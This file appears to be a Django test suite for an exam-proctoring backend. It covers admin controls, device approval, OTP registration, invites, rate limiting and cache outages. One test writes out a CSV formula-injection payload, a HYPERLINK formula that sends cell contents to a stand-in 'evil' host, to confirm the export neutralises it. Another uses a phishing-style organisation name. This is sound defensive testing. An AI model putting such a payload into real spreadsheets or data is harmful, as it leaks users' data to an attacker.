from datetime import timedelta

from django.db.models import RestrictedError
from django.test import override_settings
from django.utils.timezone import now

from accounts.models import EmailOTP, User, UserDevice
from admin_panel.report_export import generate_assessment_csv
from attempt_events.models import AttemptEvent
from exams.models import Answer, Exam, ExamAttempt
from monitoring.models import Violation
from organisations.models import OrganisationInvite, OrganisationMember
from organisations.utils import sync_user_organisation_context

from .helpers import ApiTestCase, PhoneKey


class AdminTests(ApiTestCase):
    def setUp(self):
        super().setUp()
        self.admin_client = self.client_for(self.owner)
        self.student = self.add_member("student@example.com")
        self.phone = self.approved_phone(self.student)
        self.client_s = self.client_for(self.student, self.phone)
        self.exam = self.make_exam()
        self.attempt_id = self.start(self.client_s, self.phone, self.exam).data["attempt_id"]
        self.client_s.post("/api/exams/answers/save/", {
            "attempt_id": self.attempt_id, "question_id": self.questions[0].id,
            "answer": self.correct[self.questions[0].id]}, format="json")

    def test_questions_locked_once_any_attempt_exists(self):
        res = self.admin_client.patch(f"/api/admin/exam/{self.exam.id}/update/", {
            "questions": [{"text": "new", "question_type": "mcq", "points": 1, "options": [
                {"text": "a", "is_correct": True}, {"text": "b", "is_correct": False}]}],
        }, format="json")
        self.assertEqual(res.status_code, 400)
        self.assertEqual(Answer.objects.filter(attempt_id=self.attempt_id).count(), 1)

    def test_answer_evidence_restricts_question_delete_but_exam_delete_cascades(self):
        with self.assertRaises(RestrictedError):
            self.questions[0].delete()
        Exam.objects.get(pk=self.exam.pk).delete()  # model-level cascade still works
        self.assertFalse(Answer.objects.exists())

    def test_toggle_off_grades_active_attempts(self):
        self.admin_client.post(f"/api/admin/exam/{self.exam.id}/toggle/")
        attempt = ExamAttempt.objects.get(pk=self.attempt_id)
        self.assertEqual((attempt.status, attempt.end_reason, attempt.points_scored),
                         ("terminated", "exam_disabled_by_admin", 2))

    def test_clear_violations_leaves_audit_event(self):
        self.client_s.post("/api/monitoring/log/", {"attempt_id": self.attempt_id,
                                                    "type": "app_backgrounded"}, format="json")
        res = self.admin_client.post(f"/api/admin/exam/{self.exam.id}/user/student@example.com/clear/")
        self.assertEqual(res.status_code, 200)
        self.assertFalse(Violation.objects.exists())
        event = AttemptEvent.objects.get(event_type="violations_cleared")
        self.assertEqual(event.metadata["cleared_by"], self.owner.id)

    def test_csv_formula_injection_neutralised(self):
        self.student.name = '=HYPERLINK("http://evil/?"&A2,"x")'
        self.student.save()
        csv_text = generate_assessment_csv(self.exam)
        self.assertIn("'=HYPERLINK", csv_text)
        self.assertNotIn(',=HYPERLINK', csv_text)

    def test_exam_validation(self):
        base = {"title": "x", "duration": 10, "start_time": now().isoformat(),
                "end_time": (now() - timedelta(hours=1)).isoformat(), "questions": []}
        res = self.admin_client.post("/api/admin/exam/create/", base, format="json")
        self.assertIn("end_time", res.data)
        base["end_time"] = (now() + timedelta(hours=1)).isoformat()
        base["questions"] = [{"text": "q", "question_type": "mcq", "points": 1, "options": [
            {"text": "a", "is_correct": True}, {"text": "b", "is_correct": True}]}]
        self.assertEqual(self.admin_client.post("/api/admin/exam/create/", base,
                                                format="json").status_code, 400)
        base["violation_limit"] = 0
        base["questions"][0]["options"][1]["is_correct"] = False
        res = self.admin_client.post("/api/admin/exam/create/", base, format="json")
        self.assertIn("violation_limit", res.data)

    def test_admin_function_views_rate_limit_per_admin(self):
        other_admin = self.add_member("admin2@example.com", role="admin")
        other_client = self.client_for(other_admin)
        for _ in range(20):
            self.admin_client.post(f"/api/admin/exam/{self.exam.id}/toggle/")
        self.assertEqual(self.admin_client.post(
            f"/api/admin/exam/{self.exam.id}/toggle/").status_code, 429)
        self.assertEqual(other_client.post(
            f"/api/admin/exam/{self.exam.id}/toggle/").status_code, 200)


class DeviceTests(ApiTestCase):
    def setUp(self):
        super().setUp()
        self.student = self.add_member("student@example.com")
        self.client_s = self.client_for(self.student)
        self.admin_client = self.client_for(self.owner)

    def register(self, client, phone, model="Pixel"):
        return client.post("/api/accounts/devices/register/", {
            "device_id": phone.device_id, "public_key": phone.public_b64, "model_name": model,
        }, format="json")

    def test_first_device_trusted_second_needs_approval(self):
        first, second = PhoneKey("one"), PhoneKey("two")
        self.assertEqual(self.register(self.client_s, first).data["status"], "approved")
        res = self.register(self.client_s, second)
        self.assertEqual((res.data["status"], res.data["pending_reason"]), ("pending", "device_change"))

        listing = self.admin_client.get("/api/organisations/test-org/devices/")
        self.assertEqual([d["id"] for d in listing.data], [res.data["id"]])
        approve = self.admin_client.post(f"/api/organisations/test-org/devices/{res.data['id']}/approve/")
        self.assertEqual(approve.data["status"], "approved")
        statuses = dict(UserDevice.objects.values_list("device_id", "status"))
        self.assertEqual(statuses[first.device_id], "revoked")

    def test_reinstall_same_device_rekeys(self):
        phone = PhoneKey("same")
        self.register(self.client_s, phone)
        reinstalled = PhoneKey("same")  # same ANDROID_ID hash, new Keystore key
        res = self.register(self.client_s, reinstalled)
        self.assertEqual(res.data["status"], "approved")
        self.assertEqual(UserDevice.objects.get(device_id=phone.device_id).public_key,
                         reinstalled.public_b64)

    def test_shared_device_needs_approval(self):
        phone = PhoneKey("shared")
        self.register(self.client_s, phone)
        friend = self.add_member("friend@example.com")
        res = self.register(self.client_for(friend), phone)
        self.assertEqual((res.data["status"], res.data["pending_reason"]), ("pending", "shared_device"))

    def test_invalid_key_and_id_rejected(self):
        res = self.client_s.post("/api/accounts/devices/register/",
                                 {"device_id": "abc", "public_key": "x"}, format="json")
        self.assertEqual(res.data["code"], "invalid_device_id")
        res = self.client_s.post("/api/accounts/devices/register/",
                                 {"device_id": "a" * 64, "public_key": "bm90LWEta2V5"}, format="json")
        self.assertEqual(res.data["code"], "invalid_public_key")

    def test_no_device_change_during_exam(self):
        phone = PhoneKey("p1")
        self.register(self.client_s, phone)
        exam = self.make_exam()
        self.start(self.client_for(self.student, phone), phone, exam)
        res = self.register(self.client_s, PhoneKey("p2"))
        self.assertEqual(res.data["code"], "device_change_during_exam")

    def test_admin_of_other_org_cannot_touch_device(self):
        from organisations.models import Organisation
        res = self.register(self.client_s, PhoneKey("x1"))
        self.register(self.client_s, PhoneKey("x2"))
        stranger = self.make_user("stranger@example.com")
        other = Organisation.objects.create(name="Other", slug="other", owner=stranger)
        OrganisationMember.objects.create(organisation=other, user=stranger, role="owner")
        pending = UserDevice.objects.get(status="pending")
        res = self.client_for(stranger).post(f"/api/organisations/other/devices/{pending.id}/approve/")
        self.assertEqual(res.status_code, 404)


class AccountTests(ApiTestCase):
    def test_deactivated_account_cannot_reregister_via_otp(self):
        banned = self.make_user("banned@example.com")
        banned.is_active = False
        banned.save()
        record = EmailOTP(email="banned@example.com")
        record.set_otp("123456")
        record.save()
        res = self.client.post("/api/accounts/verify-otp-register/", {
            "email": "banned@example.com", "otp": "123456", "name": "B",
            "password": "An0ther-strong-pass"}, format="json")
        self.assertEqual(res.status_code, 400)
        self.assertFalse(User.objects.get(email="banned@example.com").is_active)

    def test_pending_unverified_account_can_complete_registration(self):
        User.objects.create_user(username="new@example.com", email="new@example.com",
                                 password="x-Strong-pass-1", is_active=False)
        record = EmailOTP(email="new@example.com")
        record.set_otp("654321")
        record.save()
        res = self.client.post("/api/accounts/verify-otp-register/", {
            "email": "new@example.com", "otp": "654321", "name": "N",
            "password": "An0ther-strong-pass"}, format="json")
        self.assertEqual(res.status_code, 200)
        self.assertTrue(User.objects.get(email="new@example.com").email_verified)

    def test_no_enumeration(self):
        res = self.client.post("/api/accounts/verify-otp/", {"email": "nobody@example.com",
                                                             "otp": "000000"}, format="json")
        self.assertEqual(res.data["error"], "Invalid OTP")
        inactive = self.make_user("inactive@example.com")
        inactive.is_active = False
        inactive.save()
        res = self.client.post("/api/login/", {"email": "inactive@example.com",
                                               "password": "wrong"}, format="json")
        self.assertNotIn("inactive", str(res.data).lower())

    def test_login_limit_is_per_email_not_global(self):
        self.make_user("a@example.com")
        self.make_user("b@example.com")
        for _ in range(10):
            self.client.post("/api/login/", {"email": "a@example.com", "password": "bad"}, format="json")
        self.assertEqual(self.client.post("/api/login/", {"email": "a@example.com", "password": "bad"},
                                          format="json").status_code, 429)
        ok = self.client.post("/api/login/", {"email": "b@example.com",
                                              "password": "Str0ng-pass-123"}, format="json")
        self.assertEqual(ok.status_code, 200)

    @override_settings(MIN_ANDROID_APP_VERSION=5)
    def test_old_android_app_gets_426(self):
        res = self.client.get("/api/health/", HTTP_X_CLIENT="android", HTTP_X_APP_VERSION="4")
        self.assertEqual(res.status_code, 426)
        res = self.client.get("/api/health/", HTTP_X_CLIENT="android", HTTP_X_APP_VERSION="5")
        self.assertEqual(res.status_code, 200)


class InviteTests(ApiTestCase):
    def test_existing_user_is_not_force_added(self):
        existing = self.make_user("existing@example.com")
        res = self.client_for(self.owner).post("/api/organisations/test-org/invite/",
                                               {"email": "existing@example.com"}, format="json")
        self.assertEqual(res.data["status"], "invite created")
        self.assertFalse(OrganisationMember.objects.filter(user=existing).exists())
        sync_user_organisation_context(existing)  # login must not auto-accept
        self.assertFalse(OrganisationMember.objects.filter(user=existing).exists())

        client = self.client_for(existing)
        inbox = client.get("/api/organisations/invites/").data
        self.assertEqual(len(inbox), 1)
        self.assertIsNotNone(OrganisationInvite.objects.get().expires_at)
        joined = client.post("/api/organisations/join/", {"code": inbox[0]["token"]}, format="json")
        self.assertEqual(joined.data["status"], "joined")

    def test_new_user_still_auto_joins(self):
        self.client_for(self.owner).post("/api/organisations/test-org/invite/",
                                         {"email": "fresh@example.com"}, format="json")
        fresh = self.make_user("fresh@example.com")  # registered after the invite
        sync_user_organisation_context(fresh)
        self.assertTrue(OrganisationMember.objects.filter(user=fresh).exists())

    def test_org_name_rejects_link_like_names(self):
        res = self.client_for(self.owner).post("/api/organisations/create/",
                                               {"name": "Verify at evil.com"}, format="json")
        self.assertEqual(res.status_code, 400)


class CacheOutageTests(ApiTestCase):
    @override_settings(CACHES={"default": {
        "BACKEND": "django_redis.cache.RedisCache",
        "LOCATION": "redis://127.0.0.1:6390/0",  # nothing listens here
        "OPTIONS": {"CLIENT_CLASS": "django_redis.client.DefaultClient",
                    "IGNORE_EXCEPTIONS": True, "SOCKET_CONNECT_TIMEOUT": 0.2},
    }})
    def test_rate_limited_endpoints_stay_available_when_redis_is_down(self):
        from django.core.cache import caches
        caches._settings = None
        res = self.client.post("/api/login/", {"email": "owner@example.com",
                                               "password": "Str0ng-pass-123"}, format="json")
        self.assertEqual(res.status_code, 200)
